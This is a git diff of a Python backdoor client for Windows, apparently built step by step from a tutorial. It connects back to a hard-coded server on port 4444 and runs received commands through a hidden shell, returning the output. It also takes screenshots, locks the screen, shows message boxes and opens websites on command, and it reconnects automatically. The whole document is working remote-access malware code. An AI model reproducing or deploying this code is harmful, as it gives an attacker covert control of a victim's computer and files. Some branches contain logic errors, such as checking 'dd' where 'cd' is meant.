@@ -30,21 +30,20 @@ import win32crypt
 
 from winreg import *
 
-from backdoor_server import intBuff
 from miscs.colors import fColors, bColors
 from miscs.string_format import StringFormat
 
 
 # Step 2: Define Global Variables
 # TODO: for testing change SERVER_HOST to Kali WSL IP Address
-SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
-# SERVER_HOST = "172.29.132.195" # Kali WSL IP Address, Server for testing
+# SERVER_HOST = "192.168.10.100"  # Server IP Address - Main Windows as Server, VM-Win10 as Client
+SERVER_HOST = "172.29.132.195" # Kali WSL IP Address, Server for testing
 SERVER_PORT = 4444
 
 strPATH = path.realpath(argv[0])
 TMP = environ['APPDATA']
 
-intBuffer = 1024
+intBuff = 1024
 
 # Define VBScript Object's Numbers to use in the MessageBox
 vbOkOnly = "0"
@@ -160,19 +159,41 @@ def command_shell():
         # Receive Command from the Backdoor Server
         strData = decode_utf8(recv(intBuff))
 
-        byteData = b''
-
         # `goback` Command use for Set current dir and exit from CMD Hijacking
         if strData == 'goback':
             chdir(strCurrentDir)
+            # main_exec()
             break
 
-        # Handling 'cd' || 'chdir' Command
-        elif strData[:2].lower() == 'cd' or strData[:5].lower() == 'chdir':
+        # Handling 'cd' command to navigate to Home Directory
+        elif len(strData) == 2 and strData == 'cd':
+            homeDirectory = path.expanduser('~')
+            chdir(homeDirectory)
+            byteData = str.encode("\n" + str(getcwd()) + ">> ")
 
+        # Handling 'cd witi_path' command to navigate to with_path Directory
+        elif strData.startswith('cd '):
+            # Splicing the command to remove the cd and the extract directory path
+            directory = strData[3:]
+
+            # Try to Change Directory and handle the error if it occurs
+            # noinspection PyBroadException
+            try:
+                chdir(directory)
+            except:
+                byteData = str.encode("\n" + str(getcwd()) + ">> ")
+            else:
+                byteData = str.encode("\n" + str(getcwd()) + ">> ")
+
+
+        # Handling 'cd' || 'chdir' Command
+        elif strData[:2].lower() == 'dd' or strData[:5].lower() == 'chdir':
+
+            # if len(strData) == 2:
             # Execute Command and store stdout, stderr and stdin
-            objCommand = subprocess.Popen(
-                strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE ,shell=True)
+            objCommand = subprocess.Popen(strData + " & cd",
+                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                          stdin=subprocess.PIPE ,shell=True)
 
             # If command runs successfully without any error
             if (objCommand.stderr.read()).decode('utf-8') == '':
@@ -196,36 +217,22 @@ def command_shell():
             # Get out stdout and stderr from executed command
             strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode('utf-8', errors='replace')
 
-            byteData = str.encode("\n" + str(getcwd()) + ">> ")
+            byteData = str.encode(strOutput + "\n" + str(getcwd()) + ">> ")
 
         # Handle if the submited command is wrong
         else:
             byteData = b'Error !!'
 
+
         # Get len of byteData to send All Bytes to the server
-        strBuffer = str(len(byteData))
+        strBuffer = str(len(byteData)) # noqa
 
         # First Send: Send len of byteData to the server
         send(str.encode(strBuffer))
 
         sleep(0.1)
 
-        # Second Send: All Bytes of stdout+stderr to the server
         send(byteData)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -243,51 +250,51 @@ def MessageBox(message):
     subprocess.Popen(['cscript', TMP + "/m.vbs"], shell=True)
 
 
+def main_exec():
+    while True:
+        try:
+            while True:
+                # Receive and Decode Received Data(Command) from the Backdoor Server
+                strData = recv(intBuff)
+                strData = decode_utf8(strData)
 
-while True:
-    try:
-        while True:
-            # Receive and Decode Received Data(Command) from the Backdoor Server
-            strData = recv(intBuffer)
-            strData = decode_utf8(strData)
+                # When '--x' Command Submit, Receive 'exit' from the Backdoor server
+                if strData == 'exit':
+                    objSocket.close() # noqa
+                    exit(0)
 
-            # When '--x' Command Submit, Receive 'exit' from the Backdoor server
-            if strData == 'exit':
-                objSocket.close() # noqa
-                exit(0)
+                # When '--m' Command Submit, Receive 'msg' from the Backdoor server
+                elif strData[:3] == 'msg':
+                    MessageBox(strData[4:])
 
-            # When '--m' Command Submit, Receive 'msg' from the Backdoor server
-            elif strData[:3] == 'msg':
-                MessageBox(strData[4:])
+                # When '--o' Command Submit, Receive 'site' from the Backdoor server
+                elif strData[:4] == 'site':
+                    webbrowser.get().open(strData[4:], new=2)
 
-            # When '--o' Command Submit, Receive 'site' from the Backdoor server
-            elif strData[:4] == 'site':
-                webbrowser.get().open(strData[4:], new=2)
-                
-            # When '--p' Command Submit, Receive 'screen' from the Backdoor server
-            elif strData == 'screen':
-                screenshot()
+                # When '--p' Command Submit, Receive 'screen' from the Backdoor server
+                elif strData == 'screen':
+                    screenshot()
 
-            # When '--p 1' Command Submit, Receive 'prscreen' from the Backdoor server
-            elif strData == 'prscreen':
-                screenshot(all_screens=False)
+                # When '--p 1' Command Submit, Receive 'prscreen' from the Backdoor server
+                elif strData == 'prscreen':
+                    screenshot(all_screens=False)
 
-            # When '--x 1' Command Submit, Receive 'lock' from the Backdoor server
-            elif strData == 'lock':
-                lock()
+                # When '--x 1' Command Submit, Receive 'lock' from the Backdoor server
+                elif strData == 'lock':
+                    lock()
 
-            # Step 34: Add New `elif` Statement in Main While to Detect 'cmd' Command
-            elif strData == 'cmd':
-                command_shell()
+                # Step 34: Add New `elif` Statement in Main While to Detect 'cmd' Command
+                elif strData == 'cmd':
+                    command_shell()
 
-    # Handle if Backdoor Server not Responding try to Reconnect to Server
-    except socket.error():
-        objSocket.close()
-        del objSocket
-        server_connect()
+        # Handle if Backdoor Server not Responding try to Reconnect to Server
+        except socket.error():
+            objSocket.close()
+            del objSocket
+            server_connect()
+            main_exec()
 
-
-
+main_exec()
 
 
 
